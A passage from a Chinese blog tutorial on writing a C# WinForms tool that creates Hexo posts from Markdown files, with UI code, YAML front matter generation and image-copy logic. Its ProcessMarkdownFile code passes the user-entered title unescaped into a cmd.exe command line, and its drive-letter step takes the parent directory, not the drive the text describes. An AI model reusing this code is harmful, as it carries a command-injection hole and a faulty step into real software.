class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 复制图片到目标目录</span></span><br><span class="line">                        <span class="built_in">string</span> targetPath = targetMarkdownPictureDirectory+<span class="string">&quot;/&quot;</span> + imgFilename;</span><br><span class="line">                        <span class="keyword">await</span> Task.Run(() =&gt; File.Copy(imgPath, targetPath, <span class="literal">true</span>));  <span class="comment">// 异步复制图片</span></span><br><span class="line">                        </span><br><span class="line">                        AppendMessage(<span class="string">$&quot;[*] Copying image: <span class="subst">&#123;imgPath&#125;</span> to <span class="subst">&#123;targetPath&#125;</span>&quot;</span>, Color.Blue);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 更新 Markdown 内容</span></span><br><span class="line">                        <span class="built_in">string</span> newReference = <span class="string">$&quot;&#123;&#123;% asset_img <span class="subst">&#123;imgFilename&#125;</span> %&#125;&#125;&quot;</span>;</span><br><span class="line">                        fileContent = fileContent.Replace(match.Value, newReference);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">                    &#123;</span><br><span class="line">                        AppendMessage(<span class="string">$&quot;[-] Error moving image <span class="subst">&#123;imgPath&#125;</span>: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    AppendMessage(<span class="string">$&quot;[-] Image not found: <span class="subst">&#123;imgPath&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                    <span class="comment">// 可以选择是否退出或继续处理</span></span><br><span class="line">                    <span class="comment">// exit();  // 如果需要退出的话</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 将内容合并</span></span><br><span class="line">            <span class="built_in">string</span> finalContent = frontMatter.ToString() + Environment.NewLine + fileContent;</span><br><span class="line">            <span class="comment">// 写入文件</span></span><br><span class="line">            <span class="comment">//File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8);</span></span><br><span class="line">            <span class="keyword">await</span> Task.Run(() =&gt; File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8));</span><br><span class="line">            AppendMessage(<span class="string">$&quot;[+] successfully processed <span class="subst">&#123;filePath&#125;</span> to <span class="subst">&#123;targetMarkdownFilePath&#125;</span>&quot;</span>, Color.Green);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h5 id="获取tags、categories等相关信息UI"><a href="#获取tags、categories等相关信息UI" class="headerlink" title="获取tags、categories等相关信息UI"></a>获取tags、categories等相关信息UI</h5><p>主要也是用<strong>TableLayoutPanel</strong>进行页面设计，这里我们先改一下Form1.cs，让点击File的菜单栏后不是只有弹文件选择，而是先利用之前实现的<strong>AddTab</strong>来创建一个<strong>TabPage</strong>，然后再调用<strong>FileProcessor.cs</strong>中的<strong>CreateProcessMarkdownPanel</strong>方法来返回文件处理的面板。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Form1.cs</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">FileToolStripMenuItem_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    AddTab(<span class="string">&quot;File&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (tabName)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="string">&quot;File&quot;</span>:</span><br><span class="line">        <span class="comment">// 创建文件选择对话框</span></span><br><span class="line">        <span class="keyword">using</span> (OpenFileDialog fileDialog = <span class="keyword">new</span> OpenFileDialog())</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 设置对话框的描述</span></span><br><span class="line">            fileDialog.Title = <span class="string">&quot;请选择文件&quot;</span>;</span><br><span class="line">            fileDialog.Filter = <span class="string">&quot;Markdown 文件 (*.md)|*.md|所有文件 (*.*)|*.*&quot;</span>; <span class="comment">// 你可以根据需要设置过滤器</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">// 显示文件选择对话框并检查用户是否选择了文件</span></span><br><span class="line">            <span class="keyword">if</span> (fileDialog.ShowDialog() == DialogResult.OK)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// 获取选中的文件路径</span></span><br><span class="line">                selectedFilePath = fileDialog.FileName;</span><br><span class="line">              </span><br><span class="line">                <span class="comment">// 处理选中的文件</span></span><br><span class="line">                FileProcessor processor = <span class="keyword">new</span> FileProcessor();</span><br><span class="line">                newTab.Controls.Add(processor.CreateProcessMarkdownPanel(selectedFilePath));</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>每一行的设计也有区别，首先文章标题的输入可以直接使用TextBox文本框获取。而tags和categories由于可以存在多个，可行的方案之一是也用TextBox读取，然后指定某个分隔符来分开多个不同的tag和category。但这样显然比较麻烦，所以我们可以使用<strong>FlowLayoutPanel</strong>来进行动态的布局设计，目标是可以创建一系列不同的TextBox输入框，点击+按钮新建一个tag输入框，点击-按钮删除一个tag输入框。该布局模板可以动态的根据屏幕大小进行适应，比如可以自动换行，相当方便。+-按钮都要绑定一个点击事件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 FlowLayoutPanel 用来容纳多个输入框</span></span><br><span class="line">tagsPanel = <span class="keyword">new</span> FlowLayoutPanel</span><br><span class="line">&#123;</span><br><span class="line">    Dock = DockStyle.Top,</span><br><span class="line">    AutoSize = <span class="literal">true</span>,</span><br><span class="line">    FlowDirection = FlowDirection.LeftToRight,  <span class="comment">// 横向排列</span></span><br><span class="line">    WrapContents = <span class="literal">true</span>,  <span class="comment">// 容量满了之后自动换行</span></span><br><span class="line">    Padding = <span class="keyword">new</span> Padding(<span class="number">10</span>)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 创建加号按钮</span></span><br><span class="line">addTagButton = <span class="keyword">new</span> Button</span><br><span class="line">&#123;</span><br><span class="line">    Text = <span class="string">&quot;+&quot;</span>,</span><br><span class="line">    AutoSize = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line">addTagButton.Click += AddTagButton_Click;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建减号按钮</span></span><br><span class="line">removeTagButton = <span class="keyword">new</span> Button</span><br><span class="line">&#123;</span><br><span class="line">    Text = <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    AutoSize = <span class="literal">true</span></span><br><span class="line">&#125;;</span><br><span class="line">removeTagButton.Click += RemoveTagButton_Click;</span><br><span class="line"><span class="comment">// 添加初始的标签输入框</span></span><br><span class="line">AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">........................................................</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    AddInputBox(tagsPanel, tagsTextBoxes, addTagButton, removeTagButton);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveTagButton_Click</span>(<span class="params"><span class="built_in">object</span> sender, EventArgs e</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    RemoveInputBox(tagsPanel, tagsTextBoxes, removeTagButton);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后就是核心的<strong>AddInputBox</strong>和<strong>RemoveInputBox</strong>函数实现。需要注意的是边界条件的处理，我们在只有一个输入框时可以不显示<code>-</code>按钮，以防止越界。而且如果直接往<strong>inputPanel</strong>(也就是调用者的<strong>tagsPanel</strong>)中加TextBox，会导致<code>+-</code>不显示在所有输入框之后，比较不美观。所以我们可以每次增加输入框时，先删去原来的<code>+-</code>按钮，待TextBox增加入控件后，最后再次添加按钮回来。这样就能确保按钮位置正确。这里抽象出了<strong>AddInputBox</strong>和<strong>RemoveInputBox</strong>函数是为了tag和category的处理都能够复用。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">AddInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button addButton, Button removeButton</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 创建新的 TextBox 控件</span></span><br><span class="line">    TextBox newInputTextBox = <span class="keyword">new</span> TextBox</span><br><span class="line">    &#123;</span><br><span class="line">        Width = <span class="number">100</span>,  <span class="comment">// 设置适当的宽度</span></span><br><span class="line">        Margin = <span class="keyword">new</span> Padding(<span class="number">5</span>)  <span class="comment">// 设置间距</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将新的 TextBox 添加到列表和面板</span></span><br><span class="line">    textBoxesList.Add(newInputTextBox);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 先移除+-号按钮，之后再添加，确保在最后一个位置</span></span><br><span class="line">    <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">        inputPanel.Controls.Remove(removeButton);</span><br><span class="line">    inputPanel.Controls.Remove(addButton);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加新的输入框和按钮</span></span><br><span class="line">    inputPanel.Controls.Add(newInputTextBox);</span><br><span class="line">    inputPanel.Controls.Add(addButton);  <span class="comment">// 将加号按钮添加到 inputPanel 中</span></span><br><span class="line">    <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">        inputPanel.Controls.Add(removeButton);  <span class="comment">// 将减号按钮添加到 inputPanel 中</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">RemoveInputBox</span>(<span class="params">Control inputPanel, List&lt;TextBox&gt; textBoxesList, Button removeButton</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (textBoxesList.Count &gt; <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 获取列表中最后一个添加的 TextBox 和相应的按钮</span></span><br><span class="line">        TextBox lastInputTextBox = textBoxesList.Last();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 从 inputPanel 和 textBoxesList 中移除最后一个 TextBox 和按钮</span></span><br><span class="line">        <span class="keyword">if</span> (lastInputTextBox != <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            inputPanel.Controls.Remove(lastInputTextBox);</span><br><span class="line">            textBoxesList.Remove(lastInputTextBox);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 如果只有一个标签输入框，则隐藏减号按钮</span></span><br><span class="line">    <span class="keyword">if</span> (textBoxesList.Count == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (inputPanel.Controls.Contains(removeButton))</span><br><span class="line">            inputPanel.Controls.Remove(removeButton);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250127234914952.png"
                      class=""
                >

<p>获取用户输入的Tags和Category也比较方便。能够直接返回一个string类型的数组。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取用户输入的所有标签</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;<span class="built_in">string</span>&gt; <span class="title">GetTags</span>()</span></span><br><span class="line">&#123;</span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; tags = <span class="keyword">new</span> List&lt;<span class="built_in">string</span>&gt;();</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">var</span> textBox <span class="keyword">in</span> tagsTextBoxes)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">string</span>.IsNullOrWhiteSpace(textBox.Text))</span><br><span class="line">        &#123;</span><br><span class="line">            tags.Add(textBox.Text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> tags;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>然后可以添加一个提交按钮，来触发核心的文件处理函数。按钮点击后就可以隐藏，避免多次点击。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建确定按钮</span></span><br><span class="line">Button confirmButton = <span class="keyword">new</span> Button</span><br><span class="line">&#123;</span><br><span class="line">    Text = <span class="string">&quot;Process&quot;</span>,</span><br><span class="line">    Width = <span class="number">100</span>,</span><br><span class="line">    Height = <span class="number">40</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击按钮时执行 ProcessMarkdownFile</span></span><br><span class="line">confirmButton.Click += (sender, e) =&gt;</span><br><span class="line">&#123;</span><br><span class="line">    confirmButton.Visible = <span class="literal">false</span>;  <span class="comment">// 隐藏确定按钮，防止用户多次点击</span></span><br><span class="line">    <span class="built_in">string</span> title = titleTextBox.Text;</span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; tags = GetTags();</span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; category = GetCategories();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 非空检测</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">string</span>.IsNullOrWhiteSpace(title))</span><br><span class="line">    &#123;</span><br><span class="line">        MessageBox.Show(<span class="string">&quot;Title cannot be empty.&quot;</span>, <span class="string">&quot;Input Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">        <span class="keyword">return</span>;  <span class="comment">// 直接退出，不继续执行后续代码</span></span><br><span class="line">    &#125;</span><br><span class="line">    ProcessMarkdownFile(title, tags, category, filePath);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>



<h5 id="消息窗口实现"><a href="#消息窗口实现" class="headerlink" title="消息窗口实现"></a><strong>消息窗口实现</strong></h5><p>实现了上述的UI以后，界面还是有点空旷，那么其实我们可以把一些执行中的过程信息显示出来，来丰富界面，实现如下：</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 创建 Process 信息框</span></span><br><span class="line">processInfoBox = <span class="keyword">new</span> RichTextBox</span><br><span class="line">&#123;</span><br><span class="line">    Multiline = <span class="literal">true</span>,</span><br><span class="line">    Width = <span class="number">600</span>,</span><br><span class="line">    Height = <span class="number">200</span>,</span><br><span class="line">    ReadOnly = <span class="literal">true</span>,  <span class="comment">// 设置为只读</span></span><br><span class="line">    ScrollBars = RichTextBoxScrollBars.Vertical,  <span class="comment">// 启用滚动条</span></span><br><span class="line">    WordWrap = <span class="literal">true</span>,   <span class="comment">// 自动换行</span></span><br><span class="line">    Font = <span class="keyword">new</span> Font(<span class="string">&quot;Consolas&quot;</span>, <span class="number">12</span>)</span><br><span class="line">&#125;;</span><br><span class="line">.......................</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AppendMessage</span>(<span class="params"><span class="built_in">string</span> message, Color color</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 设置不同颜色（可选）</span></span><br><span class="line">    processInfoBox.SelectionColor = color;  <span class="comment">// 设置文本颜色</span></span><br><span class="line">    processInfoBox.AppendText(message + Environment.NewLine);</span><br><span class="line">    processInfoBox.ScrollToCaret();  <span class="comment">// 确保显示滚动到文本底部</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后我们调用<strong>AppendMessage</strong>就可以直接把消息显示到屏幕上了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2025/01/28/C-%E5%BC%80%E5%8F%91windows%E7%A8%8B%E5%BA%8F%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/image-20250128001534976.png"
                      class=""
                >

<h5 id="文件具体处理实现"><a href="#文件具体处理实现" class="headerlink" title="文件具体处理实现"></a>文件具体处理实现</h5><p>首先是要利用hexo的new命令来新建一个文章的架构，比较麻烦的是切换到Hexo的目录。首先我们要先从设置中读取出来，然后得截取出盘符，因为在windows上不能直接跨盘符用cd切换目录。最后才能执行<code>hexo new title</code>。这里用异步函数是为了在消息框显示内容更有层次感。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">async</span> <span class="keyword">void</span> <span class="title">ProcessMarkdownFile</span>(<span class="params"><span class="built_in">string</span> title, List&lt;<span class="built_in">string</span>&gt; tags, List&lt;<span class="built_in">string</span>&gt; category, <span class="built_in">string</span> filePath</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Settings settings = <span class="keyword">new</span> Settings();</span><br><span class="line">     settings.LoadSettings();</span><br><span class="line">     <span class="built_in">string</span> hexoDirectory = settings.HexoDirectory;</span><br><span class="line">     <span class="built_in">string</span> rootDirectory = hexoDirectory.Substring(<span class="number">0</span>, hexoDirectory.LastIndexOf(<span class="string">&quot;\\&quot;</span>));</span><br><span class="line">     <span class="built_in">string</span> postDirectory = Path.Combine(hexoDirectory, <span class="string">&quot;source&quot;</span>, <span class="string">&quot;_posts&quot;</span>);</span><br><span class="line">     <span class="built_in">string</span> hexoNewCmd = <span class="string">$&quot;hexo new \&quot;<span class="subst">&#123;title&#125;</span>\&quot;&quot;</span>;    <span class="comment">// 创建新文章命令</span></span><br><span class="line">     AppendMessage(<span class="string">$&quot;[*] executing command: <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>, Color.Black);</span><br><span class="line">     <span class="keyword">try</span></span><br><span class="line">     &#123;</span><br><span class="line">         <span class="comment">// 使用 Process 执行命令</span></span><br><span class="line">         ProcessStartInfo processStartInfo = <span class="keyword">new</span> ProcessStartInfo</span><br><span class="line">         &#123;</span><br><span class="line">             FileName = <span class="string">&quot;cmd.exe&quot;</span>,</span><br><span class="line">             Arguments = <span class="string">$&quot;/c <span class="subst">&#123;rootDirectory&#125;</span> &amp;&amp; cd <span class="subst">&#123;hexoDirectory&#125;</span> &amp;&amp; <span class="subst">&#123;hexoNewCmd&#125;</span>&quot;</span>,</span><br><span class="line">             CreateNoWindow = <span class="literal">true</span>,</span><br><span class="line">             UseShellExecute = <span class="literal">false</span>,</span><br><span class="line">             RedirectStandardOutput = <span class="literal">true</span>,</span><br><span class="line">             RedirectStandardError = <span class="literal">true</span>,</span><br><span class="line"></span><br><span class="line">         &#125;;</span><br><span class="line"></span><br><span class="line">         <span class="keyword">using</span> (Process process = Process.Start(processStartInfo))</span><br><span class="line">         &#123;</span><br><span class="line">             <span class="built_in">string</span> output = <span class="keyword">await</span> process.StandardOutput.ReadToEndAsync();</span><br><span class="line">             <span class="built_in">string</span> error = <span class="keyword">await</span> process.StandardError.ReadToEndAsync();</span><br><span class="line"></span><br><span class="line">             process.WaitForExit();</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (process.ExitCode != <span class="number">0</span>)</span><br><span class="line">             &#123;</span><br><span class="line">                 MessageBox.Show(<span class="string">$&quot;Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">                 AppendMessage(<span class="string">$&quot;[-] Error executing hexo new: <span class="subst">&#123;error&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">                 <span class="keyword">return</span>;</span><br><span class="line">             &#125;</span><br><span class="line">             <span class="keyword">if</span> (File.Exists(Path.Combine(postDirectory, title + <span class="string">&quot;.md&quot;</span>)))        <span class="comment">// 检查新文章是否创建成功</span></span><br><span class="line">                 AppendMessage(<span class="string">&quot;[+] successfully created new post!&quot;</span>,Color.Green);</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">     &#123;</span><br><span class="line">         MessageBox.Show(<span class="string">$&quot;Error: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, <span class="string">&quot;Error&quot;</span>, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure></div>

<p>然后是根据提供的几个参数来构建hexo的文章的YAML前言部分。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 构建 YAML 前言部分</span></span><br><span class="line">StringBuilder frontMatter = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br><span class="line">frontMatter.AppendLine(<span class="string">$&quot;title: <span class="subst">&#123;title&#125;</span>&quot;</span>);</span><br><span class="line">frontMatter.AppendLine(<span class="string">$&quot;date: <span class="subst">&#123;DateTime.Now:yyyy-MM-dd HH:mm:ss&#125;</span>&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 tags</span></span><br><span class="line"><span class="keyword">if</span> (tags != <span class="literal">null</span> &amp;&amp; tags.Count &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    frontMatter.AppendLine(<span class="string">&quot;tags:&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> tag <span class="keyword">in</span> tags)</span><br><span class="line">    &#123;</span><br><span class="line">        frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;tag&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加 categories</span></span><br><span class="line"><span class="keyword">if</span> (category != <span class="literal">null</span> &amp;&amp; category.Count &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    frontMatter.AppendLine(<span class="string">&quot;categories:&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="built_in">string</span> cat <span class="keyword">in</span> category)</span><br><span class="line">    &#123;</span><br><span class="line">        frontMatter.AppendLine(<span class="string">$&quot;  - <span class="subst">&#123;cat&#125;</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">frontMatter.AppendLine(<span class="string">&quot;---&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>最后就是将所有markdown文件中出现的图片通过正则匹配提取路径，并复制到指定目录，然后将图片语法替换成hexo能够解析的语法。最后将内容合并，写回hexo文章的markdown文件。</p>
<div class="highlight-container" data-rel="C#"><figure class="iseeu highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 正则表达式：查找所有的图片引用</span></span><br><span class="line"><span class="built_in">string</span> imagePattern = <span class="string">@&quot;!\[([^\]]+)\]\(([^)]+)\)&quot;</span>;</span><br><span class="line">MatchCollection matches = Regex.Matches(fileContent, imagePattern);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (Match match <span class="keyword">in</span> matches)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">string</span> altText = match.Groups[<span class="number">1</span>].Value;  <span class="comment">// 图片描述</span></span><br><span class="line">    <span class="built_in">string</span> imgPath = match.Groups[<span class="number">2</span>].Value;  <span class="comment">// 图片路径</span></span><br><span class="line"></span><br><span class="line">    imgPath = Path.GetFullPath(Path.Combine(Path.GetDirectoryName(filePath), imgPath));      <span class="comment">// 处理相对路径</span></span><br><span class="line">    imgPath = imgPath.Replace(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>);  <span class="comment">// 确保路径使用正斜杠</span></span><br><span class="line">    <span class="comment">// 提取图片文件名</span></span><br><span class="line">    <span class="built_in">string</span> imgFilename = Path.GetFileName(imgPath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查图片文件是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (File.Exists(imgPath))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 复制图片到目标目录</span></span><br><span class="line">            <span class="built_in">string</span> targetPath = targetMarkdownPictureDirectory+<span class="string">&quot;/&quot;</span> + imgFilename;</span><br><span class="line">            <span class="keyword">await</span> Task.Run(() =&gt; File.Copy(imgPath, targetPath, <span class="literal">true</span>));  <span class="comment">// 异步复制图片</span></span><br><span class="line">            </span><br><span class="line">            AppendMessage(<span class="string">$&quot;[*] Copying image: <span class="subst">&#123;imgPath&#125;</span> to <span class="subst">&#123;targetPath&#125;</span>&quot;</span>, Color.Blue);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 更新 Markdown 内容</span></span><br><span class="line">            <span class="built_in">string</span> newReference = <span class="string">$&quot;&#123;&#123;% asset_img <span class="subst">&#123;imgFilename&#125;</span> %&#125;&#125;&quot;</span>;</span><br><span class="line">            fileContent = fileContent.Replace(match.Value, newReference);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            AppendMessage(<span class="string">$&quot;[-] Error moving image <span class="subst">&#123;imgPath&#125;</span>: <span class="subst">&#123;ex.Message&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        AppendMessage(<span class="string">$&quot;[-] Image not found: <span class="subst">&#123;imgPath&#125;</span>&quot;</span>, Color.Red);</span><br><span class="line">        <span class="comment">// 可以选择是否退出或继续处理</span></span><br><span class="line">        <span class="comment">// exit();  // 如果需要退出的话</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将内容合并</span></span><br><span class="line"><span class="built_in">string</span> finalContent = frontMatter.ToString() + Environment.NewLine + fileContent;</span><br><span class="line"><span class="comment">// 写入文件</span></span><br><span class="line"><span class="comment">//File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8);</span></span><br><span class="line"><span class="keyword">await</span> Task.Run(() =&gt; File.WriteAllText(targetMarkdownFilePath, finalContent, Encoding.UTF8));</span><br><span class="line">AppendMessage(<span class="string">$&quot;[+] successfully processed <span class="subst">&#123;filePath&#125;</span> to <span class="subst">&#123;targetMarkdownFilePath&#125;</span>&quot;</span>, Color.Green);</span><br></pre></td></tr></table></figure></div>

<p>这样以后，基本功能就差不多实现了，这里只对redefine这个主题进行了适配，别的Hexo主题可能需要调整细节。更多的设置功能也可以后续慢慢的添加进去。</p>
<h4 id="常用控件"><a href="#常用控件" class="headerlink" title="常用控件"></a>常用控件</h4><table>
<thead>
<tr>
<th>控件</th>
<th>常用属性</th>
<th>常用方法</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Label</strong></td>
<td>- <code>Text</code>：显示的文本 <br />- <code>TextAlign</code>：文本对齐方式 <br />- <code>Font</code>：字体 <br />- <code>ForeColor</code>：文本颜色 <br />- <code>BackColor</code>：背景颜色 <br />- <code>AutoSize</code>：是否自动调整大小</td>
<td>- <code>SetBounds</code>：设置控件的位置和大小 <br />- <code>Focus</code>：设置焦点</td>
</tr>
<tr>
<td><strong>Button</strong></td>
<td>- <code>Text</code>：按钮文本 <br />- <code>BackColor</code>：按钮背景色 <br />- <code>ForeColor</code>：按钮文字颜色 <br />- <code>Enabled</code>：是否启用按钮 <br />- <code>Size</code>：按钮大小 <br />- <code>Tag</code>：关联的控件</td>
<td>- <code>PerformClick()</code>：模拟点击按钮 <br />- <code>Click</code>：按钮点击事件</td>
</tr>
<tr>
<td><strong>TextBox</strong></td>
<td>- <code>Text</code>：输入文本 <br />- <code>TextAlign</code>：文本对齐方式 <br />- <code>Multiline</code>：是否多行文本框<br /> - <code>MaxLength</code>：最大字符长度 <br />- <code>PasswordChar</code>：密码字符</td>
<td>- <code>Clear()</code>：清除文本 <br />- <code>Focus()</code>：设置焦点 <br />- <code>SelectAll()</code>：全选文本 <br />- <code>Paste()</code>：粘贴</td>
</tr>
<tr>
<td><strong>ComboBox</strong></td>
<td>- <code>Items</code>：项集合 <br />- <code>SelectedItem</code>：选中的项 <br />- <code>SelectedIndex</code>：选中的索引<br /> - <code>DropDownStyle</code>：下拉框风格（如 <code>DropDownList</code>）</td>
<td>- <code>Add()</code>：添加项 <br />- <code>Remove()</code>：移除项 <br />- <code>SelectedIndexChanged</code>：选项变化事件</td>
</tr>
<tr>
<td><strong>ListBox</strong></td>
<td>- <code>Items</code>：项集合 <br />- <code>SelectedItem</code>：选中的项 <br />- <code>SelectedIndex</code>：选中的索引 <br />- <code>MultiColumn</code>：是否多列显示</td>
